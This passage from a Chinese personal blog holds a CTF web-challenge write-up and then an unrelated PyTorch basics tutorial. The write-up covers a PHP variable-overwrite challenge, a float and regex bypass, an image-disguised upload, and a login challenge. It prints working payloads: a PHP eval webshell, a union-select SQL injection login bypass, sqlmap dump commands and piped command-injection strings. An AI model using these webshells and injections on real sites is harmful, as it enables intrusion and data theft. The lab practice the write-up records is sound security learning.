class="keyword">empty</span>(<span class="variable">$mode</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$mode</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your mode is the guest!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Sucess change the ini!The logs record you!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$secret</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="variable">$secret</span>;</span><br><span class="line">    <span class="variable">$secret</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mode</span> == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">//echo var_dump($GLOBALS);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$secret</span> === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;token&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$secret</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$secret</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;admin&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">999</span>;</span><br><span class="line">                <span class="title function_ invoke__">cmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            <span class="keyword">case</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">                <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-z0-9]/is&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                <span class="title function_ invoke__">cmd</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;hello,the repairman!&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$mode</span> == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;hello,the user!We may change the mode to repaie the server,please keep it unchanged&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:5;url=index.php?mode=1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><del>这里有个很奇怪的点</del>，现在不奇怪了，empty()判断，因为mode&#x3D;0，所以他会返回True，所以会一直进入那个判断，使用<code>$_SERVER[&#39;REQUEST_URI&#39;]$</code>获得url的请求给后面的参数赋值。再看后一句关键代码<code>parse_str($url[&#39;query&#39;]);</code><strong>该函数可以实现变量覆盖</strong>。按照我的理解其实就是通过GET方式给变量进行赋值</p>
<p><img src="/../images/CTF-web-2.assets/image-20230317152033186.png" alt="image-20230317152033186"></p>
<p>继续读代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$secret</span> === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;token&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这一段代码可以不看跳过，不进入这个分支，直接进switch，进admin的分支，然后执行cmd的exec，无回显操作，所以只需要构造合适的变量，使得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$secret</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;admin&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">999</span>;</span><br><span class="line">                <span class="title function_ invoke__">cmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            <span class="keyword">case</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;test&#x27;</span>.<span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>]):</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">                <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-z0-9]/is&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                <span class="title function_ invoke__">cmd</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;hello,the repairman!&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>走第一个分支，即构造</p>
<p><code>secret=md5(adminfuck)&amp;config[secret]=fuck</code>就能进cmd()函数，然后接收POST传参cmd</p>
<p>全部payload:<code>http://127.0.0.1/index.php?mode=0&amp;secret=307686a811aa4a924266ab5772513d58&amp;config[secret]=fuck</code></p>
<p>POST:<code>cmd=cat config.php &gt; 1.txt</code></p>
<p>补：&#x3D;&#x3D;exec()无回显判断命令执行：<code>cmd=ls | sleep 5</code>&#x3D;&#x3D;</p>
<h2 id="ICS-07"><a href="#ICS-07" class="headerlink" title="ICS-07"></a>ICS-07</h2><p>从页面的提示，在<code>/view-source.php</code>中可以观察到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; <span class="title function_ invoke__">floatval</span>(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = False;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据源码意思，我们先绕过<code>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;) </code>这句话，获得admin的session，获得之后会有一个上传文件的能力，但是需要绕过正则匹配，那么有想法了，先绕过第一个。</p>
<p><img src="/../images/CTF-web-2.assets/image-20211020221212966.png" alt="image-20211020221212966"></p>
<p>跟简单就能够造出符合要求的字符，如<code>1*9</code>等等</p>
<h2 id="Include2"><a href="#Include2" class="headerlink" title="Include2"></a>Include2</h2><p><code>?file=flag.php</code>后，提示我们存在<code>upload.php</code>页面，那么我们打开，是一个上传图片的页面，观察分析源码，显然传图片马</p>
<p><img src="/../images/CTF-web-2.assets/image-20211020234511799.png" alt="image-20211020234511799"></p>
<p>这里还有一个坑，这里会匹配<code>&lt;?php&gt;</code>等字符替换成<code>_</code>导致php解析失败</p>
<p>所以我们换一种写马方式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;</span><br><span class="line"><span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>图片后缀仍写为<code>.jpg</code>，因为这个过滤是在后端，前端修改回.php仍无法上传。上传成功后回回显路径</p>
<p><img src="/../images/CTF-web-2.assets/image-20211021001832746.png" alt="image-20211021001832746"></p>
<p>&#x3D;&#x3D;注意！！！&#x3D;&#x3D;</p>
<p>这里我们使用file&#x3D;的形式去访问储存文件夹！不然无法正常连接蚁剑，如下访问</p>
<p><code>http://114.67.246.176:15029/index.php?file=upload/202110200407109163.jpg</code></p>
<p><img src="/../images/CTF-web-2.assets/image-20211021002025807.png" alt="image-20211021002025807"></p>
<p>如图，连接上后显示其文件层级，最后在根目录下发现flag</p>
<h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>对于一个前端的登录页面，我们显然先抓包分析一下</p>
<p><img src="/../images/CTF-web-2.assets/image-20211021141147050.png" alt="image-20211021141147050"></p>
<p>response中有一个tip密文，base64解码后是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>意思是让我们传入一个非空的password且内容等于其对应的md5值。</p>
<p>先待定，对于登录框肯定要上sqlmap看看有无回显</p>
<p><code>sqlmap -r login2.txt --dbs</code>可以发现，其<code>username</code>参数存在时间盲注</p>
<p>一段时间等待后回发现结果</p>
<p><img src="/../images/CTF-web-2.assets/image-20211021142257495.png" alt="image-20211021142257495"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211021142443888.png" alt="image-20211021142443888"></p>
<p>看库名猜测关键信息大概率在bugkuctf中，接下来查询表名，列名和内容，最后输出username和password两列的内容</p>
<p><code>sqlmap -r login2.txt -D bugkuctf -T admin -C password,username --dump  --level 5 --time-sec=1</code></p>
<p>这里补充一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程</a></p>
<p><img src="/../images/CTF-web-2.assets/image-20211021143654305.png" alt="image-20211021143654305"></p>
<p>然而爆出来的结果为空，也就是说sqlmap思路断了，但我们也知道了它的字段不超过三个。那就思考提示，构造union查询</p>
<p><code>admin&#39;union select 1,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;password=admin</code></p>
<p>注意转换后的<code>21232f297a57a5a743894a0e4a801fc3</code>为admin(密码)的md5，且用单引号括起来。发送报文后即可显示成功登录</p>
<p><img src="/../images/CTF-web-2.assets/image-20211021144700397.png" alt="image-20211021144700397"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211021144946943.png" alt="image-20211021144946943"></p>
<p>进入后有一个监控系统，猜测其可以执行Linux指令，输入ls查看回显发现其将输入的指令转换为grep后参数进行查询</p>
<p>参考了大佬的思路后才理解，可以使用二次写入，即使用<code>1|cat /flag &gt; test</code></p>
<p>这会将根目录下的flag的内容写入新的当前路径中的&#x2F;test页面下，之后只需要访问</p>
<p><code>http://xxx.xxx.xxx.xxx/test</code>即可得到对应的内容</p>
<p><img src="/../images/CTF-web-2.assets/image-20211021155120529.png" alt="image-20211021155120529"></p>
<p>当然还可以有其他思路</p>
<ul>
<li>公网Ip反弹shell</li>
<li>时间盲注跑脚本</li>
</ul>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-web</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2023/11/22/CTF-web-2/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-Pytorch学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/" target="_blank">Pytorch学习</a>
  
    </h1>
  


  
  
<a href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
        <time datetime="2023-11-16T14:26:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-16</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>
    Pytorch学习
</center>

<h1 id="Pytorch学习"><a href="#Pytorch学习" class="headerlink" title="Pytorch学习"></a>Pytorch学习</h1><p>[toc]</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>查看package的相关内容函数</p>
<ul>
<li><code>dir()</code>：解包，显示库内所含的内容，显示内容为下划线开始的命名时，说明该内容为函数，可以使用</li>
<li><code>help()</code>：可以显示该函数的使用方法和类型</li>
</ul>
<p>上述两幅图片分别是使用下两行代码运行的结果，其中help()要把函数的括号去掉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(torch,cuda))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(torch.cuda.is_available))</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：在jupyter notebook中，<code>shift+enter</code>能够执行代码段，包名加<code>??</code>可以显示具体内容</p>
<p>检测pytorch是否可运行GPU加速</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count())</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.get_device_name(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure>

<p><code>torch.stack((x,y),dim=0)</code>：可以将x和y<strong>增加维度</strong>的合并</p>
<p><code>torch.cat((x,y),dim=0)</code>：可以将x和y<strong>不增加维度</strong>合并</p>
<h3 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h3><p>pytorch与numpy之间数组的转换：<code>torch.from_numpy()</code></p>
<p>定义张量：<code>torch.Tensor([3,4])</code></p>
<p>定义浮点张量：<code>torch.FloatTensor([3,4])</code></p>
<p>定义随机维度张量矩阵：<code>torch.randn(3,4)</code></p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907143426854.png" alt="image-20220907143426854"></p>
<p>相关结果如上</p>
<p>经过测试，tensor的访问与列表操作一直，也支持切片等操作</p>
<p><strong>tensor与numpy之间的相互转换</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np_tensor=np.random.randn(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(np_tensor)</span><br><span class="line">py_tensor=torch.from_numpy(np_tensor)</span><br><span class="line"><span class="built_in">print</span>(py_tensor)</span><br><span class="line">new_np_tensor=py_tensor.numpy()</span><br><span class="line"><span class="built_in">print</span>(new_np_tensor)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907144015333.png" alt="image-20220907144015333"></p>
<h3 id="GPU-tensor与CPU-tensor相互转换"><a href="#GPU-tensor与CPU-tensor相互转换" class="headerlink" title="GPU tensor与CPU tensor相互转换"></a>GPU tensor与CPU tensor相互转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x=torch.randn(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">x_gpu=x.cuda(<span class="number">0</span>) <span class="comment"># 将x放在第一块GPU上进行运算</span></span><br><span class="line"><span class="built_in">print</span>(x_gpu)</span><br><span class="line">x_cpu=x_gpu.cpu() <span class="comment"># 将GPU的资源放到CPU上运算</span></span><br><span class="line"><span class="built_in">print</span>(x_cpu)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907144807419.png" alt="image-20220907144807419"></p>
<p><strong>注意</strong>：只用CPU上的资源可以转换为numpy，直接将GPU转化为numpy会报错，因此需</p>
<p><code>x_array=x_gpu.cpu().numpy()</code></p>
<h3 id="Tensor操作"><a href="#Tensor操作" class="headerlink" title="Tensor操作"></a>Tensor操作</h3><h4 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x=torch.ones(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">y=torch.ones(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">z=torch.ones(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">k=x+<span class="number">3</span>             <span class="comment"># 矩阵与标量运算</span></span><br><span class="line">k=torch.add(x,<span class="number">3</span>)  <span class="comment"># 矩阵与矩阵运算</span></span><br><span class="line">k=torch.mm(x,z)   <span class="comment"># 矩阵与矩阵的乘法(叉乘),(1,2)*(2,3)=(1,3)</span></span><br><span class="line">k=torch.mul(x,y)  <span class="comment"># 矩阵与矩阵的点乘,(1,2).(1,2)=(1,2)</span></span><br></pre></td></tr></table></figure>

<h4 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=torch.randn(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(x.size())</span><br><span class="line"><span class="built_in">print</span>(x.shape)    <span class="comment"># 注意shape不带括号</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907160501930.png" alt="image-20220907160501930"></p>
<p><strong>重新排列矩阵</strong></p>
<p><code>x=x.view(3,4)</code>，<code>x=x.view(12)</code></p>
<p>将上述生成4*3矩阵转换成3*4以及12维行向量</p>
<p><strong>增加维度</strong></p>
<p><code>torch.unsqueeze(x,dim=1)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">torch.unsqueeze(x,dim=<span class="number">1</span>)</span><br><span class="line">x=x.unsqueeze(<span class="number">1</span>)</span><br><span class="line">x.shape</span><br></pre></td></tr></table></figure>

<p>此时输出结果为<code>torch.Size([4,1,3])</code></p>
<p>若要减少维度可以使用<code>torch.squeeze(x,dim=1)</code></p>
<p><strong>查询最大最小值</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">max_value,max_index=torch.<span class="built_in">max</span>(x,dim=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(max_value,max_index)</span><br><span class="line"><span class="comment"># 也可写成</span></span><br><span class="line">max_value,max_index=x.<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>注意，<code>torch.max(x,dim=1)</code>函数，返回<strong>每一行</strong>的最大值与索引，先是值，后索引。并且0代表列，1代表行</p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907163024762.png" alt="image-20220907163024762"></p>
<p><code>x.sum(0)</code>：输出每一列的和</p>
